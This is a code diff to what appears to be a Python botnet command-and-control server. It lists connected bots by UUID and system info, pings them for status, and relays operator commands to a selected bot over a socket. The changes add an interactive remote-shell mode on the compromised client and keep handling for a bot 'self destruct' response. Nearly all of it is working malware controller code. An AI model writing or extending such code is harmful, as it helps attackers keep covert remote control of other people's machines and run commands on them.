@@ -78,7 +78,7 @@ def main():
 						CLIENT_SOCK.send(str.encode("pingbot"))
 						OUTPUT=CLIENT_SOCK.recv(BUFFER)
 						OUTPUT=OUTPUT.decode()
-						if OUTPUT=='pingbot':
+						if OUTPUT=='BOT ONLINE':
 							BOTSTEMP[1]="ONLINE"
 						else:
 							BOTSTEMP[1]="OFFLINE/SENT UNKNOWN RESPONSE"
@@ -91,7 +91,7 @@ def main():
 			for i in range(BOTNOS):
 				try:
 					BOTSTEMP=BOTS[i+1]
-					print("--------------------------------------------------------------------------------------")
+					print("-"*80)
 					print("Bot Number: ",i+1,"Bot Info ",BOTSTEMP[0])
 				except:
 					pass
@@ -113,20 +113,33 @@ def main():
 				BOTSTEMP=BOTS[BOTNO]
 				print("[SYSTEM | BOT Info] Using bot ",BOTNO)
 				CLIENT_SOCK,CLIENT_ADDR=BOTSTEMP[2],BOTSTEMP[3]
+				SHELL=False
 				while True:
 					try:
-						COMM_SEND=input()
-						if COMM_SEND=="":
-							print("[SYSTEM] Empty Request Detected!")
+						COMM_SEND=""
+						if SHELL==False:
+							COMM_SEND=input("\nBOT >>")
 						else:
-							if COMM_SEND=="background":
-								print("[SYSTEM | BOT Info] Backgrounding bot ",BOTNO)
-								break
+							COMM_SEND=input()
+						if COMM_SEND=="background":
+							print("[SYSTEM | BOT Info] Backgrounding bot ",BOTNO)
+							break
+						elif (COMM_SEND=="" or str.isspace(COMM_SEND)) and SHELL==False:
+							print("[SYSTEM | Input Error] Blank Command!")
+						elif (COMM_SEND=="" or str.isspace(COMM_SEND)) and SHELL==True:
+							CLIENT_SOCK.send(str.encode("Request current path"))
+							COMM_RECV=CLIENT_SOCK.recv(BUFFER)
+							print(COMM_RECV.decode(),end='')
+						else:
 							COMM_SEND=COMM_SEND.encode()
 							CLIENT_SOCK.send(COMM_SEND)
 							COMM_RECV=CLIENT_SOCK.recv(BUFFER)
 							COMM_RECV=COMM_RECV.decode()
 							print(COMM_RECV,end="")
+							if COMM_RECV[:25]=="[Client] Shell Connected!":
+								SHELL=True
+							if COMM_RECV=="[Client] Closing Shell":
+								SHELL=False
 							if COMM_RECV=="[Client] Self Destruct Initiated!":
 								print("\n")
 								break
@@ -164,7 +177,7 @@ def BOTCONNECTOR():
 			print("[SYSTEM] Client ready to accept commands!")
 			print("[CLIENT] UUID: ",ACK_RECV[6:42])
 			BOTS[BOTNOS]=[ACK_RECV,"ONLINE",CLIENT_SOCK,CLIENT_ADDR]
-			print(f"[CLIENT]Printing Sysinfo:\n {ACK_RECV}",end="")
+			print(f"[CLIENT]Printing Sysinfo:\n {ACK_RECV} \nNET >>",end="")
 			if KILLTHREAD:
 				break
 		except Exception as Exec:
